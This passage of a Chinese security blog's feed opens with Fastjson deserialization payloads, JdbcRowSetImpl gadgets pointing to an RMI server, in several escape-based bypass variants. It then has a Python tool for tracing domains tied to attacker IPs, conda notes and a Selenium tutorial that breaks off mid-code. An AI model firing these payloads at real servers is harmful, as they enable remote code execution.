class="hljs-punctuation">&#123;</span>&#x27;\x40\u0074\x79\u0070\x65&#x27;<span class="hljs-punctuation">:</span>xjava.lang.AutoCloseable<span class="hljs-string">&quot;... ]]]]]</span><br></code></pre></td></tr></table></figure><p>各种特性</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">,</span>new<span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span>NaN<span class="hljs-punctuation">,</span>x&#x27;<span class="hljs-number">00</span>&#x27;<span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">,</span><span class="hljs-comment">/*&#125;*/</span>&#x27;\x40\u0074\x79\u0070\x65&#x27;<span class="hljs-punctuation">:</span>xjava.lang.AutoClosea ble<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>文章推荐：<a href="https://www.sec-in.com/article/950">https://www.sec-in.com/article/950</a><br>Fastjson默认会去除键、值外的空格、<code>\b</code>、<code>\n</code>、<code>\r</code>、<code>\f</code>等，同时还会自动将键与值进行unicode与十六进制解码。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-comment">/*s6*/</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span>\n<span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-string">&quot;@type&quot;</span>\b<span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span>  <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;\x40\x74\x79\x70\x65&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>fastjson</tag>
      
      <tag>payload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python编写的溯源工具</title>
    <link href="/2024/08/16/%E4%BD%BF%E7%94%A8%20python%20%E7%BC%96%E5%86%99%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E5%B7%A5%E5%85%B7/"/>
    <url>/2024/08/16/%E4%BD%BF%E7%94%A8%20python%20%E7%BC%96%E5%86%99%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h4 id="0、简介-🛠️"><a href="#0、简介-🛠️" class="headerlink" title="0、简介 🛠️"></a>0、简介 🛠️</h4><p>这是一个用 Python 编写的溯源工具，方便快捷地查询恶意 IP 地址绑定的历史域名、域名解析 IP 以及备案信息等，助你轻松追踪网络威胁来源。🔍🌐</p><h4 id="1、代码"><a href="#1、代码" class="headerlink" title="1、代码"></a>1、代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib3<br><br><span class="hljs-comment"># 禁用SSL警告信息</span><br>urllib3.disable_warnings()<br><br><span class="hljs-comment"># 设置颜色</span><br>RED = <span class="hljs-string">&#x27;\033[91m&#x27;</span><br>GREEN = <span class="hljs-string">&#x27;\033[92m&#x27;</span><br>YELLOW = <span class="hljs-string">&#x27;\033[33m&#x27;</span><br>BLUE = <span class="hljs-string">&#x27;\033[36m&#x27;</span><br>RESET = <span class="hljs-string">&#x27;\033[0m&#x27;</span><br><br><span class="hljs-comment"># 定义常量</span><br>HEADERS = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36 Edg/81.0.416.58&quot;</span><br>&#125;<br><br>PROXIES = &#123;<br>    <span class="hljs-string">&#x27;none&#x27;</span>: &#123;<span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;https&quot;</span>: <span class="hljs-literal">None</span>&#125;<br>&#125;<br><br><span class="hljs-comment"># 正则表达式</span><br>ip138_domain_re = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;&lt;/span&gt;&lt;a href=&quot;/(.*?)/&quot;&#x27;</span>)<br>geturl_title_re = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;title&gt;(.*?)&lt;/title&gt;&quot;</span>)<br><br><span class="hljs-comment"># 使用集合以避免重复的域名</span><br>domains_set = <span class="hljs-built_in">set</span>()<br><br><span class="hljs-comment"># 存储IP列表</span><br>ip_lists = []<br><br><span class="hljs-comment"># 结果保存文件</span><br>result_file = <span class="hljs-string">&#x27;result.txt&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">result</span>(<span class="hljs-params">target</span>):<br>    <span class="hljs-comment"># 打印信息</span><br>    <span class="hljs-built_in">print</span>(target)<br>    <br>    <span class="hljs-comment"># 去掉颜色ANSI码</span><br>    target = replace(target)<br>    <span class="hljs-comment"># 保存结果</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(result_file, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>, mode=<span class="hljs-string">&quot;a+&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(target + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br><br><span class="hljs-comment"># 去掉颜色ANSI码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">replace</span>(<span class="hljs-params">message</span>):<br>    message = message.replace(RED,<span class="hljs-string">&#x27;&#x27;</span>).replace(GREEN,<span class="hljs-string">&#x27;&#x27;</span>).replace(YELLOW,<span class="hljs-string">&#x27;&#x27;</span>).replace(BLUE,<span class="hljs-string">&#x27;&#x27;</span>).replace(RESET,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">return</span> message<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">icplishi_search</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    查询历史备案信息</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        req = requests.get(url, headers=HEADERS, proxies=PROXIES[<span class="hljs-string">&quot;none&quot;</span>], timeout=<span class="hljs-number">5</span>, verify=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;--没有查询到记录--&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> req.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;错误信息：&#x27;</span>, e)<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack_tracing</span>(<span class="hljs-params">ip</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    根据IP查询绑定的域名, 并检查这些域名是否备案</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        url = <span class="hljs-string">f&quot;https://site.ip138.com/<span class="hljs-subst">&#123;ip&#125;</span>&quot;</span><br>        req = requests.get(url, headers=HEADERS, proxies=PROXIES[<span class="hljs-string">&quot;none&quot;</span>], timeout=<span class="hljs-number">5</span>, verify=<span class="hljs-literal">False</span>)<br>        domains = ip138_domain_re.findall(req.text)<br>        <span class="hljs-keyword">if</span> domains:<br>            result(<span class="hljs-string">f&quot;--------------------------------------\n&quot;</span>)<br>            result(<span class="hljs-string">f&quot;[+] <span class="hljs-subst">&#123;GREEN&#125;</span><span class="hljs-subst">&#123;ip&#125;</span><span class="hljs-subst">&#123;RESET&#125;</span> 查询到历史绑定域名！(查询：<span class="hljs-subst">&#123;url&#125;</span>)&quot;</span>)<br>            <span class="hljs-comment"># 遍历域名</span><br>            <span class="hljs-keyword">for</span> domain <span class="hljs-keyword">in</span> domains:<br>                <span class="hljs-comment"># 获取主域名</span><br>                <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;([a-zA-Z0-9-]+)\.([a-zA-Z0-9-]+\.[a-zA-Z]+)&#x27;</span>, domain)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>                    domains_set.add(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>))<br>                <span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">                解析域名绑定的ip地址 </span><br><span class="hljs-string">                &quot;&quot;&quot;</span><br>                <span class="hljs-keyword">try</span>:<br>                    domain_ip = socket.gethostbyname(domain)<br>                    <span class="hljs-keyword">if</span> domain_ip:<br>                        <span class="hljs-keyword">if</span> domain_ip == ip:<br>                            result(<span class="hljs-string">f&quot;[+] <span class="hljs-subst">&#123;GREEN&#125;</span><span class="hljs-subst">&#123;domain&#125;</span><span class="hljs-subst">&#123;RESET&#125;</span> 解析IP: <span class="hljs-subst">&#123;GREEN&#125;</span><span class="hljs-subst">&#123;domain_ip&#125;</span><span class="hljs-subst">&#123;RESET&#125;</span>&quot;</span>)<br>                        <span class="hljs-keyword">else</span>:<br>                            result(<span class="hljs-string">f&quot;[+] <span class="hljs-subst">&#123;domain&#125;</span> 解析IP: <span class="hljs-subst">&#123;domain_ip&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">except</span>:<br>                    result(<span class="hljs-string">f&quot;[-] <span class="hljs-subst">&#123;RED&#125;</span><span class="hljs-subst">&#123;domain&#125;</span><span class="hljs-subst">&#123;RESET&#125;</span> 解析IP, 失败!&quot;</span>)<br>            <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            查询备案</span><br><span class="hljs-string">            &quot;&quot;&quot;</span><br>            <span class="hljs-keyword">if</span> domains_set:<br>                <span class="hljs-comment"># 将集合转换为列表</span><br>                domain_list = <span class="hljs-built_in">list</span>(domains_set)<br>                <span class="hljs-keyword">for</span> domain <span class="hljs-keyword">in</span> domain_list:<br>                    <span class="hljs-comment"># 判断域名是否备案</span><br>                    url = <span class="hljs-string">f&quot;https://www.beianx.cn/search/<span class="hljs-subst">&#123;domain&#125;</span>&quot;</span><br>                    <span class="hljs-keyword">if</span> icplishi_search(url):<br>                        result(<span class="hljs-string">f&quot;[+] <span class="hljs-subst">&#123;GREEN&#125;</span><span class="hljs-subst">&#123;domain&#125;</span><span class="hljs-subst">&#123;RESET&#125;</span> 已备案 (查询：<span class="hljs-subst">&#123;url&#125;</span>)&quot;</span>)<br>                    <span class="hljs-keyword">else</span>:<br>                        result(<span class="hljs-string">f&quot;[-] <span class="hljs-subst">&#123;RED&#125;</span><span class="hljs-subst">&#123;domain&#125;</span><span class="hljs-subst">&#123;RESET&#125;</span> 未备案&quot;</span>)<br>                    time.sleep(<span class="hljs-number">5</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n--------------------------------------&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] <span class="hljs-subst">&#123;ip&#125;</span> 没有绑定域名&quot;</span>)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;错误信息：&#x27;</span>, e)<br>        <span class="hljs-keyword">pass</span><br>    domains_set.clear()<br><br><br><span class="hljs-comment"># 主循环</span><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ip.txt&#x27;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>, mode=<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-keyword">for</span> target <span class="hljs-keyword">in</span> f:<br>                ip = target.rstrip(<span class="hljs-string">&quot;\n&quot;</span>)<br>                <span class="hljs-keyword">if</span> ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ip_lists:<br>                    ip_lists.append(ip)<br>                    attack_tracing(ip)<br>        time.sleep(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Tips: 把脚本和ip.txt 放在同目录下运行。&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="2、截图"><a href="#2、截图" class="headerlink" title="2、截图"></a>2、截图</h4><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/0b7089b9f9f6f29061f92554bedbd6c.png" alt="0b7089b9f9f6f29061f92554bedbd6c"></p>]]></content>
    
    
    
    <tags>
      
      <tag>信息收集</tag>
      
      <tag>溯源反制</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>conda 使用笔记</title>
    <link href="/2024/08/08/conda%20%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/08/08/conda%20%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h4 id="🐍-创建Conda环境"><a href="#🐍-创建Conda环境" class="headerlink" title="🐍 创建Conda环境"></a>🐍 创建Conda环境</h4><p>Conda 可以帮助你在同一台机器上创建多个相互隔离的 Python 环境，方便管理不同项目的依赖。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 示例：创建一个名为 test 的环境，Python 版本为 3.9</span><br>conda create -n <span class="hljs-built_in">test</span> python=3.9<br></code></pre></td></tr></table></figure><hr><h4 id="🔄-切换Conda环境"><a href="#🔄-切换Conda环境" class="headerlink" title="🔄 切换Conda环境"></a>🔄 切换Conda环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 激活指定环境</span><br>conda activate &lt;env_name&gt;<br><br><span class="hljs-comment"># 退出当前环境</span><br>conda deactivate<br></code></pre></td></tr></table></figure><hr><h4 id="📋-查看已安装环境"><a href="#📋-查看已安装环境" class="headerlink" title="📋 查看已安装环境"></a>📋 查看已安装环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看所有已创建的环境</span><br>conda info --envs<br></code></pre></td></tr></table></figure><hr><h4 id="❌-删除Conda环境"><a href="#❌-删除Conda环境" class="headerlink" title="❌ 删除Conda环境"></a>❌ 删除Conda环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 删除指定环境及其所有包</span><br>conda remove -n &lt;env_name&gt; --all<br></code></pre></td></tr></table></figure><hr><h4 id="🔍-查看Conda信息"><a href="#🔍-查看Conda信息" class="headerlink" title="🔍 查看Conda信息"></a>🔍 查看Conda信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看当前环境中安装的所有依赖包</span><br>conda list<br><br><span class="hljs-comment"># 查看所有环境信息</span><br>conda info --envs<br></code></pre></td></tr></table></figure><hr><h4 id="📦-安装依赖包"><a href="#📦-安装依赖包" class="headerlink" title="📦 安装依赖包"></a>📦 安装依赖包</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在当前环境安装新的依赖包，例如 requests</span><br>conda install requests<br></code></pre></td></tr></table></figure><hr><h4 id="⚙️-设置关闭启动时自动激活-base-环境"><a href="#⚙️-设置关闭启动时自动激活-base-环境" class="headerlink" title="⚙️ 设置关闭启动时自动激活 base 环境"></a>⚙️ 设置关闭启动时自动激活 base 环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 设置后启动终端不会自动进入 base 环境</span><br>conda config --<span class="hljs-built_in">set</span> auto_activate_base <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><hr><p>💡 小贴士</p><ul><li>建议为不同项目创建独立环境，避免依赖冲突。</li><li>使用 <code>conda env export &gt; environment.yml</code> 可以导出环境配置，方便分享和复现。</li><li>结合 <code>conda update conda</code> 定期更新conda工具，保证稳定性和安全。</li></ul><p>祝你使用顺利！🚀</p>]]></content>
    
    
    
    <tags>
      
      <tag>系统环境</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用 python 实现浏览器自动化</title>
    <link href="/2024/07/16/%E4%BD%BF%E7%94%A8%20python%20%E5%AE%9E%E7%8E%B0%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    <url>/2024/07/16/%E4%BD%BF%E7%94%A8%20python%20%E5%AE%9E%E7%8E%B0%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h4 id="0、简介-✨"><a href="#0、简介-✨" class="headerlink" title="0、简介 ✨"></a>0、简介 ✨</h4><p>Selenium 可以在无人参与的情况下自动操作浏览器，通过代码模拟用户行为，实现自动化流程，比如输入文本、提交表单等。</p><h4 id="1、安装-🛠️"><a href="#1、安装-🛠️" class="headerlink" title="1、安装 🛠️"></a>1、安装 🛠️</h4><ol><li>安装 selenium 库</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install selenium<br></code></pre></td></tr></table></figure><ol start="2"><li>查看浏览器版本（确保驱动匹配）</li></ol><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20240716144724361.png" alt="image-20240716144724361"></p><ol start="3"><li>下载对应浏览器驱动</li></ol><ul><li>Chrome 驱动下载地址：<a href="https://googlechromelabs.github.io/chrome-for-testing/">https://googlechromelabs.github.io/chrome-for-testing/</a></li><li>Firefox 驱动下载地址：<a href="https://github.com/mozilla/geckodriver/releases">https://github.com/mozilla/geckodriver/releases</a></li></ul><p>下载与你浏览器版本匹配的驱动文件，放到 Python 项目根目录。</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20240716144545993.png" alt="image-20240716144545993"><br><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20240716144857117.png" alt="image-20240716144857117"></p><h4 id="2、演示代码-💻"><a href="#2、演示代码-💻" class="headerlink" title="2、演示代码 💻"></a>2、演示代码 💻</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By<br><br><span class="hljs-comment"># 定义元素定位</span><br>input_location = (By.XPATH, <span class="hljs-string">&#x27;//*[@id=&quot;ww&quot;]&#x27;</span>)<br>button_location = (By.XPATH, <span class="hljs-string">&#x27;//*[@id=&quot;s_btn_wr&quot;]&#x27;</span>)<br>news_location = (By.XPATH, <span class="hljs-string">&#x27;//*[@id=&quot;1&quot;]/div/h3/a&#x27;</span>)<br><br><span class="hljs-comment"># 初始化 Chrome 浏览器参数</span><br>chrome_options = webdriver.ChromeOptions()<br>chrome_options.add_argument(<span class="hljs-string">&quot;--incognito&quot;</span>)  <span class="hljs-comment"># 隐身模式</span><br>chrome_options.add_experimental_option(<span class="hljs-string">&quot;excludeSwitches&quot;</span>, [<span class="hljs-string">&quot;enable-logging&quot;</span>])  <span class="hljs-comment"># 关闭自动化和日志信息</span><br><br><span class="hljs-comment"># 创建浏览器实例</span><br>browser = webdriver.Chrome(options=chrome_options)<br>browser.get(<span class="hljs-string">&quot;https://news.baidu.com/&quot;</span>)  <span class="hljs-comment"># 打开网页</span><br>browser.maximize_window()  <span class="hljs-comment"># 最大化窗口</span><br>browser.implicitly_wait(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 隐式等待</span><br><br><span class="hljs-comment"># 操作页面元素</span><br>browser.find_element(*input_location).send_keys(<span class="hljs-string">&quot;熊猫&quot;</span>)  <span class="hljs-comment"># 输入搜索关键词</span><br>browser.find_element(*button_location).click()          <span class="hljs-comment"># 点击搜索按钮</span><br>text = browser.find_element(*news_location).text        <span class="hljs-comment"># 获取第一条新闻标题</span><br><span class="hljs-built_in">print</span>(text)<br><br>time.sleep(<span class="hljs-number">3</span>)  <span class="hljs-comment"># 等待3秒</span><br>browser.quit()  <span class="hljs-comment"># 关闭浏览器</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/IMG_20240716150127.gif" alt="IMG\_20240716150127"></p><h4 id="3、参数扩展及优化-⚙️"><a href="#3、参数扩展及优化-⚙️" class="headerlink" title="3、参数扩展及优化 ⚙️"></a>3、参数扩展及优化 ⚙️</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 